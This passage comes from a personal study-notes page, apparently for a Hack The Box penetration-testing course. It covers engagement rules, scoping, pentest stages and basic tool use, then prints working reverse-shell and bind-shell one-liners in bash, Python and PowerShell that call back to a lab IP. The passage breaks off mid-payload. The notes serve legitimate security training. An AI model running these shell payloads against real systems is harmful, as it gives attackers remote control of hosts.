limitations specified</li><li>Take measures to prevent causing damage to the systems or networks being tested</li><li>Do not access, use or disclose personal data or any other information obtained during the testing without permission</li><li>Do not intercept electronic communications without the consent of one of the parties to the communication</li><li>Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization</li></ul><h3 id=pre-engagement-documents>Pre-Engagement Documents<a hidden class=anchor aria-hidden=true href=#pre-engagement-documents>#</a></h3><table><thead><tr><th>Document</th><th>Timing for Creation</th></tr></thead><tbody><tr><td>1. Non-Disclosure Agreement (NDA)</td><td>After Initial Contact</td></tr><tr><td>2. Scoping Questionnaire</td><td>Before the Pre-Engagement Meeting</td></tr><tr><td>3. Scoping Document</td><td>During the Pre-Engagement Meeting</td></tr><tr><td>4. Penetration Testing Proposal (Contract/Scope of Work (SoW))</td><td>During the Pre-engagement Meeting</td></tr><tr><td>5. Rules of Engagement (RoE)</td><td>Before the Kick-Off Meeting</td></tr><tr><td>6. Contractors Agreement (Physical Assessments)</td><td>Before the Kick-Off Meeting</td></tr><tr><td>7. Reports</td><td>During and after the conducted Penetration Test</td></tr></tbody></table><h3 id=critical-scoping-questions>Critical Scoping Questions<a hidden class=anchor aria-hidden=true href=#critical-scoping-questions>#</a></h3><ul><li>How many expected live hosts?</li><li>How many IPs/CIDR ranges in scope?</li><li>How many Domains/Subdomains are in scope?</li><li>How many wireless SSIDs in scope?</li><li>How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)?</li><li>For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT?</li><li>If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed?</li><li>What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope?</li><li>Is a separate Active Directory Security Assessment desired?</li><li>Will network testing be conducted from an anonymous user on the network or a standard domain user?</li><li>Do we need to bypass Network Access Control (NAC)?</li></ul><h3 id=types-of-penetration-testing>Types of Penetration Testing<a hidden class=anchor aria-hidden=true href=#types-of-penetration-testing>#</a></h3><table><thead><tr><th>Type</th><th>Information Provided</th></tr></thead><tbody><tr><td>Blackbox</td><td>Minimal. Only the essential information, such as IP addresses and domains, is provided.</td></tr><tr><td>Greybox</td><td>Extended. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar.</td></tr><tr><td>Whitebox</td><td>Maximum. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc.</td></tr><tr><td>Red-Teaming</td><td>May include physical testing and social engineering, among other things. Can be combined with any of the above types.</td></tr><tr><td>Purple-Teaming</td><td>It can be combined with any of the above types. However, it focuses on working closely with the defenders.</td></tr></tbody></table><h3 id=penetration-testing-stages>Penetration Testing Stages<a hidden class=anchor aria-hidden=true href=#penetration-testing-stages>#</a></h3><p><figure class=image-caption><img alt="Penetration Testing Process" srcset="/posts/htb/pentester/images/pen-process_huaf24000b7b2e8a997116b1e389f7021f_118312_480x0_resize_q75_h2_box_3.webp 480w,
/posts/htb/pentester/images/pen-process_huaf24000b7b2e8a997116b1e389f7021f_118312_768x0_resize_q75_h2_box_3.webp 768w,
/posts/htb/pentester/images/pen-process_huaf24000b7b2e8a997116b1e389f7021f_118312_1024x0_resize_q75_h2_box_3.webp 1024w" sizes=100vw src=images/pen-process.png width=768 height=289 loading=lazy><figcaption></figcaption></figure></p><table><thead><tr><th>Stage</th><th>Description</th></tr></thead><tbody><tr><td>1. Pre-Engagement</td><td>The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions.</td></tr><tr><td>2. Information Gathering</td><td>Once the pre-engagement activities are complete, we investigate the company&rsquo;s existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions.</td></tr><tr><td>3. Vulnerability Assessment</td><td>With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions.</td></tr><tr><td>4. Exploitation</td><td>Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities.</td></tr><tr><td>5. Post-Exploitation</td><td>Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations).</td></tr><tr><td>6. Lateral Movement</td><td>If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered.</td></tr><tr><td>7. Proof-of-Concept</td><td>We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.</td></tr><tr><td>8. Post-Engagement</td><td>Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.</td></tr></tbody></table><h3 id=vulnerability-analysis-types>Vulnerability Analysis Types<a hidden class=anchor aria-hidden=true href=#vulnerability-analysis-types>#</a></h3><table><thead><tr><th>Analysis Type</th><th>Description</th></tr></thead><tbody><tr><td>Descriptive</td><td>Descriptive analysis is essential in any data analysis. On the one hand, it describes a data set based on individual characteristics. It helps to detect possible errors in data collection or outliers in the data set.</td></tr><tr><td>Diagnostic</td><td>Diagnostic analysis clarifies conditions&rsquo; causes, effects, and interactions. Doing so provides insights that are obtained through correlations and interpretation. We must take a backward-looking view, similar to descriptive analysis, with the subtle difference that we try to find reasons for events and developments.</td></tr><tr><td>Predictive</td><td>By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible.</td></tr><tr><td>Prescriptive</td><td>Prescriptive analytics aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process.</td></tr></tbody></table><h3 id=common-vulnerabilities-and-exposures-cves-research>Common Vulnerabilities and Exposures (CVEs) Research<a hidden class=anchor aria-hidden=true href=#common-vulnerabilities-and-exposures-cves-research>#</a></h3><ul><li><a href=https://www.cvedetails.com/ title=CVEdetails target=_blank rel="nofollow noopener">CVEdetails</a></li><li><a href=https://www.exploit-db.com/ title="Exploit DB" target=_blank rel="nofollow noopener">Exploit DB</a></li><li><a href=https://vulners.com/ title=Vulners target=_blank rel="nofollow noopener">Vulners</a></li><li><a href=https://packetstormsecurity.com/ title="Packet Storm Security" target=_blank rel="nofollow noopener">Packet Storm Security</a></li><li><a href="https://nvd.nist.gov/vuln/search?execution=e2s1" title=NIST target=_blank rel="nofollow noopener">NIST</a></li></ul><h3 id=practicing-steps>Practicing Steps<a hidden class=anchor aria-hidden=true href=#practicing-steps>#</a></h3><ul><li>2x Modules (one technical, one offensive)<ol><li>Read the module</li><li>Practice the exercises</li><li>Complete the module</li><li>Start the module exercises from scratch</li><li>While solving the exercises again, take notes</li><li>Create technical documentation based on the notes</li><li>Create non-technical documentation based on the notes</li></ol></li><li>3x Retired Machines (two easy, one medium)<ol><li><p>Get the user flag on your own</p></li><li><p>Get the root flag on your own</p></li><li><p>Write your technical documentation</p></li><li><p>Write your non-technical documentation</p></li><li><p>Compare your notes with the official write-up (or a community write-up if you don&rsquo;t have a VIP subscription</p></li><li><p>Create a list of information you have missed</p></li><li><p>Watch Ippsec&rsquo;s walkthrough and compare it with your notes</p></li><li><p>Expand your notes and documentation by adding the missed parts</p></li></ol></li><li>5x Active Machines (two easy, two medium, one hard)<ol><li>Get the user and root flag</li><li>Write your technical documentation</li><li>Write your non-technical documentation</li><li>Have it proofread by technical and non-technical persons</li></ol></li><li>1x Pro Lab / Endgame</li></ul><h3 id=complete>Complete<a hidden class=anchor aria-hidden=true href=#complete>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/90 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><p> </p><hr><p> </p><h2 id=getting-started>Getting Started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h2><ul><li><code>CIA triad</code>: &ldquo;confidentiality, integrity, and availability of data&rdquo;</li><li>A <code>hypervisor</code> is software that allows us to create and run virtual machines (VMs).</li><li>The <code>ISO</code> file is essentially just a CD-ROM that can be mounted within our hypervisor of choice to build the VM by installing the operating system ourselves. An <code>ISO</code> gives us more room for customization, e.g., keyboard layout, locale, desktop environment switch, custom partitioning, etc., and therefore a more granular approach when setting up our attack VM.</li><li>The <code>OVA</code> file is a pre-built virtual appliance that contains an OVF XML file that specifies the VM hardware settings and a <code>VMDK</code>, which is the virtual disk that the operating system is installed on. An OVA is pre-built and therefore can be rapidly deployed to get up and running quicker.</li><li>A <code>virtual private network (VPN)</code> allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company&rsquo;s corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.<ul><li><code>netstat -rn</code> will show us the networks accessible via the VPN.</li></ul></li></ul><h3 id=common-ports>Common Ports<a hidden class=anchor aria-hidden=true href=#common-ports>#</a></h3><table><thead><tr><th>Port(s)</th><th>Protocol</th></tr></thead><tbody><tr><td>20/21 (TCP)</td><td>FTP</td></tr><tr><td>22 (TCP)</td><td>SSH</td></tr><tr><td>23 (TCP)</td><td>Telnet</td></tr><tr><td>25 (TCP)</td><td>SMTP</td></tr><tr><td>80 (TCP)</td><td>HTTP</td></tr><tr><td>161 (TCP/UDP)</td><td>SNMP</td></tr><tr><td>389 (TCP/UDP)</td><td>LDAP</td></tr><tr><td>443 (TCP)</td><td>SSL/TLS (HTTPS)</td></tr><tr><td>445 (TCP)</td><td>SMB</td></tr><tr><td>3389 (TCP)</td><td>RDP</td></tr></tbody></table><h3 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li><code>Secure Shell (SSH)</code> is a network protocol that runs on port 22 by default and provides users such as system administrators a secure way to access a computer remotely.</li><li><code>Netcat</code>, <code>ncat</code>, or <code>nc</code>, is an excellent network utility for interacting with TCP/UDP ports. There&rsquo;s another Windows alternative to netcat coded in PowerShell called <a href=https://github.com/besimorhino/powercat title=PowerCat target=_blank rel="nofollow noopener"><code>PowerCat</code></a>.</li><li>Another similar network utility is <a href=https://linux.die.net/man/1/socat title=socat target=_blank rel="nofollow noopener"><code>socat</code></a>, which has a few features that netcat does not support, like forwarding ports and connecting to serial devices. Socat can also be used to upgrade a shell to a <a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat title="fully interactive TTY" target=_blank rel="nofollow noopener">fully interactive TTY</a>.</li><li>Terminal multiplexers, like <code>tmux</code> or <code>Screen</code>, are great utilities for expanding a standard Linux terminal&rsquo;s features, like having multiple windows within one terminal and jumping between them.</li><li><code>Vim</code> is a great text editor that can be used for writing code or editing text files on Linux systems.
-<code>nmap</code> for network enumeration and vulnerability scanning.<ul><li><code>nmap -sV --script=banner -p&lt;port> &lt;host(s)></code> and <code>nc -nv &lt;host> &lt;port></code>can be used for <code>Banner Grabbing</code></li></ul></li><li>A tool that can enumerate and interact with SMB shares is <code>smbclient</code>.</li><li>SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.5.0 <span class=o>=</span> STRING: <span class=s2>&#34;gs-svcscan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ snmpwalk -v 2c -c private  10.129.42.253 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Timeout: No Response from 10.129.42.253
</span></span></code></pre></div><ul><li>A tool such as <a href=https://github.com/trailofbits/onesixtyone title=onesixtyone target=_blank rel="nofollow noopener"><code>onesixtyone</code></a> can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ onesixtyone -c dict.txt 10.129.42.254
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Scanning <span class=m>1</span> hosts, <span class=m>51</span> communities
</span></span><span class=line><span class=cl>10.129.42.254 <span class=o>[</span>public<span class=o>]</span> Linux gs-svcscan 5.4.0-66-generic <span class=c1>#74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64</span>
</span></span></code></pre></div><ul><li>We can use a tool such as <a href=https://github.com/ffuf/ffuf title=ffuf target=_blank rel="nofollow noopener"><code>ffuf</code></a> or <a href=https://github.com/OJ/gobuster title=GoBuster target=_blank rel="nofollow noopener"><code>GoBuster</code></a> to perform this directory enumeration.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.0.1
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@_FireFart_<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:            http://10.10.10.121/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:        <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:       /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:     gobuster/3.0.1
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:        <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2020/12/11 21:47:25 Starting <span class=nv>gobuster</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.hta <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/.htpasswd <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/.htaccess <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/index.php <span class=o>(</span>Status: 200<span class=o>)</span>
</span></span><span class=line><span class=cl>/server-status <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/wordpress <span class=o>(</span>Status: 301<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2020/12/11 21:47:46 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><ul><li>We can use <code>cURL</code> to retrieve server header information from the command line. <code>cURL</code> can also pull down files.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ curl -IL https://www.inlanefreight.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Date: Fri, <span class=m>18</span> Dec <span class=m>2020</span> 22:24:05 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Link: &lt;https://www.inlanefreight.com/index.php/wp-json/&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;https://api.w.org/&#34;</span>
</span></span><span class=line><span class=cl>Link: &lt;https://www.inlanefreight.com/&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span>shortlink
</span></span><span class=line><span class=cl>Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>100</span>  144k  <span class=m>100</span>  144k    <span class=m>0</span>     <span class=m>0</span>  176k      <span class=m>0</span> --:--:-- --:--:-- --:--:-- 176k
</span></span></code></pre></div><ul><li>Another handy tool is <a href=https://github.com/FortyNorthSecurity/EyeWitness title=EyeWitness target=_blank rel="nofollow noopener"><code>EyeWitness</code></a>, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.</li><li>We can extract the version of web servers, supporting frameworks, and applications using the command-line tool <code>whatweb</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ whatweb 10.10.10.121
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://10.10.10.121 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>license@php.net<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.121<span class=o>]</span>, Title<span class=o>[</span>PHP 7.4.3 - phpinfo<span class=o>()]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ whatweb --no-errors 10.10.10.0/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://10.10.10.11 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>nginx/1.14.1<span class=o>]</span>, IP<span class=o>[</span>10.10.10.11<span class=o>]</span>, PoweredBy<span class=o>[</span>Red,nginx<span class=o>]</span>, Title<span class=o>[</span>Test Page <span class=k>for</span> the Nginx HTTP Server on Red Hat Enterprise Linux<span class=o>]</span>, nginx<span class=o>[</span>1.14.1<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.10.10.100 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.100<span class=o>]</span>, Title<span class=o>[</span>File Sharing Service<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.10.10.121 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>license@php.net<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.121<span class=o>]</span>, Title<span class=o>[</span>PHP 7.4.3 - phpinfo<span class=o>()]</span>
</span></span><span class=line><span class=cl>http://10.10.10.247 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Bootstrap, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>contact@cross-fit.htb<span class=o>]</span>, Frame, HTML5, HTTPServer<span class=o>[</span>OpenBSD httpd<span class=o>]</span>, IP<span class=o>[</span>10.10.10.247<span class=o>]</span>, JQuery<span class=o>[</span>3.3.1<span class=o>]</span>, PHP<span class=o>[</span>7.4.12<span class=o>]</span>, Script, Title<span class=o>[</span>Fine Wines<span class=o>]</span>, X-Powered-By<span class=o>[</span>PHP/7.4.12<span class=o>]</span>, X-UA-Compatible<span class=o>[</span><span class=nv>ie</span><span class=o>=</span>edge<span class=o>]</span>
</span></span></code></pre></div><ul><li>One method to transfer files would be using <code>scp</code>, granted we have obtained ssh user credentials on the remote host.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ scp linenum.sh user@remotehost:/tmp/linenum.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>user@remotehost<span class=err>&#39;</span>s password: *********
</span></span><span class=line><span class=cl>linenum.sh
</span></span></code></pre></div><ul><li>In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to <code>base64</code> encode the file into <code>base64</code> format, and then we can paste the <code>base64</code> string on the remote server and decode it.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ base64 shell -w <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>user@remotehost$ <span class=nb>echo</span> f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU <span class=p>|</span> base64 -d &gt; shell
</span></span></code></pre></div><h3 id=shells>Shells<a hidden class=anchor aria-hidden=true href=#shells>#</a></h3><ul><li>A <code>Reverse Shell</code> is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md title="Payload All The Things" target=_blank rel="nofollow noopener">Payload All The Things</a> has many reverse shell payloads:</li></ul><p><strong>Linux Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</span>
</span></span><span class=line><span class=cl>...or...
</span></span><span class=line><span class=cl>rm /tmp/f<span class=p>;</span>mkfifo /tmp/f<span class=p>;</span>cat /tmp/f<span class=p>|</span>/bin/sh -i 2&gt;<span class=p>&amp;</span>1<span class=p>|</span>nc 10.10.10.10 <span class=m>1234</span> &gt;/tmp/f
</span></span></code></pre></div><p><strong>Windows Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-nop</span> <span class=n>-c</span> <span class=s2>&#34;</span><span class=nv>$client</span><span class=s2> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.10&#39;,1234);</span><span class=nv>$s</span><span class=s2> = </span><span class=nv>$client</span><span class=s2>.GetStream();[byte[]]</span><span class=nv>$b</span><span class=s2> = 0..65535|%{0};while((</span><span class=nv>$i</span><span class=s2> = </span><span class=nv>$s</span><span class=s2>.Read(</span><span class=nv>$b</span><span class=s2>, 0, </span><span class=nv>$b</span><span class=s2>.Length)) -ne 0){;</span><span class=nv>$data</span><span class=s2> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class=nv>$b</span><span class=s2>,0, </span><span class=nv>$i</span><span class=s2>);</span><span class=nv>$sb</span><span class=s2> = (iex </span><span class=nv>$data</span><span class=s2> 2&gt;&amp;1 | Out-String );</span><span class=nv>$sb2</span><span class=s2> = </span><span class=nv>$sb</span><span class=s2> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class=nv>$sbt</span><span class=s2> = ([text.encoding]::ASCII).GetBytes(</span><span class=nv>$sb2</span><span class=s2>);</span><span class=nv>$s</span><span class=s2>.Write(</span><span class=nv>$sbt</span><span class=s2>,0,</span><span class=nv>$sbt</span><span class=s2>.Length);</span><span class=nv>$s</span><span class=s2>.Flush()};</span><span class=nv>$client</span><span class=s2>.Close()&#34;</span> 
</span></span></code></pre></div><ul><li>Another type of shell is a <code>Bind Shell</code>. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets&rsquo; listening port. Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host&rsquo;s shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system. <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md title="Payload All the Things" target=_blank rel="nofollow noopener">Payload All the Things</a> again has payloads for this.</li></ul><p><strong>Linux Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>rm /tmp/f<span class=p>;</span>mkfifo /tmp/f<span class=p>;</span>cat /tmp/f<span class=p>|</span>/bin/bash -i 2&gt;<span class=p>&amp;</span>1<span class=p>|</span>nc -lvp <span class=m>1234</span> &gt;/tmp/f
</span></span><span class=line><span class=cl>...or...
</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;exec(&#34;&#34;&#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&#34;0.0.0.0&#34;,1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&#34;&#34;&#34;)&#39;</span>
</span></span></code></pre></div><p><strong>Windows Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-NoP</span> <span class=n>-NonI</span> <span class=n>-W</span> <span class=n>Hidden</span> <span class=n>-Exec</span> <span class=n>Bypass</span> <span class=n>-Command</span> <span class=nv>$listener</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Net.Sockets.TcpListener</span><span class=p>]</span><span class=mf>1234</span><span class=p>;</span> <span class=nv>$listener</span><span class=p>.</span><span class=py>start</span><span class=p>();</span><span class=nv>$client</span> <span class=p>=</span> <span class=nv>$listener</span><span class=p>.</span><span class=py>AcceptTcpClient</span><span class=p>();</span><span class=nv>$stream</span> <span class=p>=</span> <span class=nv>$client</span><span class=p>.</span><span class=py>GetStream</span><span class=p>();[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$bytes</span> <span class=p>=</span> <span class=mf>0</span><span class=p>.</span><span class=mf>.65535</span><span class=p>|%{</span><span class=mf>0</span><span class=p>};</span><span class=k>while</span><span class=p>((</span><span class=nv>$i</span> <span class=p>=</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Read</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$bytes</span><span class=p>.</span><span class=n>Length</span><span class=p>))</span> <span class=o>-ne</span> <span class=mf>0</span><span class=p>){;</span><span class=nv>$data</span> <span class=p>=</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>-TypeName</span> <span class=n>System</span><span class=p>.</span><span class=py>Text</span><span class=p>.</span><span class=n>ASCIIEncoding</span><span class=p>).</span><span class=py>GetString</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span> <span class=nv>$i</span><span class=p>);</span><span class=nv>$sendback</span> <span class=p>=</span> <span class=p>(</span><span class=nb>iex </span><span class=nv>$data</span> <span class=mf>2</span><span class=p>&gt;&amp;</span><span class=mf>1</span> <span class=p>|</span> <span class=nb>Out-String</span> <span class=p>);</span><span class=nv>$sendback2</span> <span class=p>=</span> <span class=nv>$sendback</span> <span class=p>+</span> <span class=s2>&#34;PS &#34;</span> <span class=p>+</span> <span class=p>(</span><span class=n>pwd</span><span class=p>).</span><span class=py>Path</span> <span class=p>+</span> <span class=s2>&#34; &#34;</span><span class=p>;</span><span class=nv>$sendbyte</span> <span class=p>=</span> <span class=p>([</span><span class=no>text.encoding</span><span class=p>]::</span><span class=n>ASCII</span><span class=p>).</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$sendback2</span><span class=p>);</span><span class=nv>$stream</span><span class=p>.</span><span class=py>Write</span><span class=p>(</span><span class=nv>$sendbyte</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$sendbyte</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span><span class=nv>$stream</span><span class=p>.</span><span class=py>Flush</span><span class=p>()};</span><span class=nv>$client</span><span class=p>.</span><span class=py>Close</span><span 